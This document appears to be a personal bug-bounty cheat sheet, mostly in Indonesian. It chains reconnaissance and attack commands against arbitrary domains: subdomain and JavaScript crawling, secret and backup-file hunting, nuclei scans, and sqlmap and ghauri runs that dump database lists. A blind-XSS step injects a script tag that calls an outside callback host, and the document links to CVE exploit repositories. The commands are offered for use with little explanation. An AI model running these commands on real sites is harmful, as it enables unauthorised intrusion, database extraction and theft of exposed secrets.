1. cari domain dengan subfinder

sunfinder -d test.com all -o test.txt

2. cari yang aktif 

cat test.txt | httpx > final.txt

3. cari subjs

cat final.txt | subjs > finals.txt

4. cari javascrip nya

katana -u test.com -jc | grep ".js$"


katana -list (kalo mau pake list ) finals.txt -jc -v | grep "".js$" > finakkatana.txt


bisa juga pake silent 

katana -list (kalo mau pake list ) finals.txt -jc -silent | grep "".js$" > finakkatana.txt

tanpa verbose atau silent

katana -list (kalo mau pake list ) finals.txt -jc | grep "".js$" -o finalkatana2.txt


katana -list finals.txt -jc -o finalkatana.txt | grep "".js$"


cari secret finder


cat finalkatana.txt | while read url; do python3 SecretFinder/SecretFinder.py -i $url -o cli > secret.txt; done

cat finalkatana.txt | while read url; do python3 SecretFinder/SecretFinder.py -i $url -o cli; done


vuln
https://sploitus.com/
https://sploitus.com/exploit?id=4D0DD59C-C302-5F17-9F2F-6F14B03B5396

https://sploitus.com/exploit?id=435DDE7B-9594-5166-A4B0-569A4A544907

https://sploitus.com/exploit?id=12AB39D5-D90E-5325-91D6-55FFA8CB8045

https://github.com/bigb0x/CVE-2024-36991/tree/main

https://github.com/bigb0x/CVE-2024-36991

https://sploitus.com/exploit?id=E63F203E-162E-5C52-B7FF-ACA9E30C9D78

https://github.com/A-little-dragon/CVE-2024-39943-Exploit

https://sploitus.com/exploit?id=B5132EDC-1A5E-5CEF-9DA8-DACA5A7DC139

https://sploitus.com/exploit?id=E6EF437E-CC04-55C6-9409-44ACC346AF24

https://sploitus.com/exploit?id=D3F94EDE-AFE1-5272-89CE-93289BA9578E


Tips trick

https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-with-sqlmap/
https://exploit-notes.hdks.org/exploit/web/cloud/aws-pentesting/
https://exploit-notes.hdks.org/exploit/web/security-risk/broken-access-control/


https://exploit-notes.hdks.org/exploit/web/security-risk/prototype-pollution-in-server-side/

https://exploit-notes.hdks.org/exploit/web/security-risk/prototype-pollution-in-client-side/

https://exploit-notes.hdks.org/exploit/web/security-risk/ssrf/

https://exploit-notes.hdks.org/exploit/web/security-risk/os-command-injection/

https://www.youtube.com/watch?v=bHdK7TGgYKI


osint

intelx



Subresource Integrity (SRI) is a security feature that enables browsers to verify that third-party resources they fetch (for example, from a CDN) are delivered without unexpected manipulation. It works by allowing developers to provide a cryptographic hash that a fetched file must match.

Third-party resources (such as scripts and stylesheets) can be manipulated. An attacker that has access or has hacked the hosting CDN can manipulate or replace the files. SRI allows developers to specify a base64-encoded cryptographic hash of the resource to be loaded. The integrity attribute containing the hash is then added to the <script> HTML element tag. The integrity string consists of a base64-encoded hash, followed by a prefix that depends on the hash algorithm. This prefix can either be sha256, sha384 or sha512.

The script loaded from the external URL specified in the Details section doesn't implement Subresource Integrity (SRI). It's recommended to implement Subresource Integrity (SRI) for all the scripts loaded from external hosts.




cara recon 


1. magicrecon.sh -w ( domain )

2 . dirsearch -u "domain" -x 301,403,404,500,400,502,503,302,429 --random-agent --deep recursive

3. dirsearch -u "domain" -e conf, config, bak, backup, smp, old, sql, asp, aspx, py, rb, tar.gz, tmp, tar, tar.bz2, tar.gz, txt, wadl, zip, log, xml, js, json

4 . subfinder -d (domain) --all -o tsubdomain.txt

5. cat tsubdomain.txt | httpx -sc -title -server -td -t 160 --random-agent

6. katana -u tsubdomain.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -jc -fx -ef woff,css,png,svg,jpg,woffw,jpeg,gif,svg, -o allurls1.txt

7. cat allurls | gf lfi | nuclei -tags lfi

8. cat allurl.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|_config"

9. dirsearch -l tsubdomain.txt -e conf, config, bak, backup, smp, old, sql, asp, aspx, py, rb, tar.gz, tmp, tar, tar.bz2, tar.gz, txt, wadl, zip, log, xml, js, json

10. cat subdomain.txt | httpx -mc 200, 302 -o  livesubdomain.txt

11. ghauri -m sql.txt --batch --dbs --level 3 --confirm

12. sqlmap -m sql.txt --batch --dbs --current-db --random-agent --tamper=space2comment,symboliclogical

13.  nuclei -l tsubdomain.txt -tags cves, osint, tech


part2 cara recon

1. subfinder -d (namadomain) -all recursive -o subdomain.txt

2. cat subdomain.txt | httpx-toolkit -ports 80,443,8080,800,888 -threads 200 > subdomains_alive.txt

3. katana -u tsubdomain.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg, -o allurls1.txt

4. cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config|\.bak"

5. cat allurls.txt | grep -E "\.js$" >> js.txt

6. cat js.txt | nuclei -t http/exposures/

7. echo nama domain | katana -ps | grep -E "\.js$"| nuclei -t /http/exposures/ -c 30

8. dirsearch -u nama domain -e conf,config,bak,backup,swp,old,db,sql,asp,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json

9. subfinder -d nama domain | httpx-toolkit -silent | katana -ps -f qurl | gf xss | bxss --appendMode -payload '"><script sc=https://xss.report/c/coffinxp></script>' -parameters

10. subzy run --targets subdomain.txt --concurrency 100 --hide_fails --verify_ssl

11. python3 corsy.py -i subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"

12. nuclei -list subdomains_alive -tags cves,osint,tech

13. cat allurls | gf lfi | nuclei -tags lfi 



contoh recon subfinder

how to use in bug bounty programs:
subfinder -d xyz.com -all  | nuclei -t crlf.yaml -rl 50
subfinder -d xyz.com -all  | nuclei -t openRedirect.yaml -rl 100
subfinder -d xyz.com -all  | nuclei -t iis.yaml
subfinder -d xyz.com -all  | nuclei -t cors.yaml -rl 100
subfinder -d xyz.com -all  | waybackurls | gf sqli | uro | nuclei -t errorsqli.yaml -rl 50


14. cat allurls.txt | gf redirect | openredirex  -p /home/x/Desktop/git/OpenRedireX/payloads.txt | anew openredirex2.txt

15. #cat subdomains_alive.txt | nuclei -t /root/nuclei-templates/cRlf.yam -v

16. cat allurls.txt | gf redirect | openredirex
